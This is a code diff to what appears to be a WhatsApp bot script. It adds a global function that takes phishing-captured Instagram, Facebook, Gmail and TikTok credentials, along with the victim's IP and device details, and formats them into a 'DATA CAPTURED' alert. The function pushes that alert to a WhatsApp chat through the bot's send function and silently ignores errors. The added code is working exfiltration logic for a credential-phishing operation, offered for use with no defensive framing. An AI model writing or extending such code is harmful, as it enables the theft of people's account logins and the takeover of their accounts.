@@ -231,6 +231,35 @@ global.warns = {};         // For warning system
 global.muted = {};         // For mute system
 global.banned = global.banned || {};  // For banned users
 
+// ── Register global callback for phishing data capture (immediate push to WhatsApp) ──
+global._sendPhishToWhatsApp = function _sendPhishToWhatsApp(type, credentials, device, ip, userId) {
+  try {
+    const brandNames = { instagram:'Instagram', facebook:'Facebook', gmail:'Gmail', tiktok:'TikTok' };
+    const brandName = brandNames[type] || type;
+    let alert =
+      `🎯 *${brandName} — DATA CAPTURED!* 🎯\n` +
+      `━━━━━━━━━━━━━━━━\n` +
+      `*🌐 IP:* ${ip || 'N/A'}\n` +
+      `━━━━━━━━━━━━━━━━\n` +
+      `*📋 CREDENTIALS:*\n`;
+    if (credentials) {
+      for (const [k, v] of Object.entries(credentials)) {
+        alert += `  • *${k}:* \`${v}\`\n`;
+      }
+    }
+    if (device) {
+      alert += `━━━━━━━━━━━━━━━━\n`;
+      alert += `*📱 Device:* ${(device.ua || 'N/A').slice(0,60)}\n`;
+    }
+    if (typeof devtrust?.sendMessage === 'function') {
+      const jid = String(userId || '').replace(/:\d+@/, '@');
+      if (jid.includes('@s.whatsapp.net') || jid.includes('@g.us')) {
+        devtrust.sendMessage(jid, { text: alert }).catch(() => {});
+      }
+    }
+  } catch (_) {}
+};
+
 // ============ ANTIEDIT / ANTIDELETE STORES ============
 if (!global._antieditStore) global._antieditStore = new Map();
 if (!global._antideleteStore) global._antideleteStore = new Map();
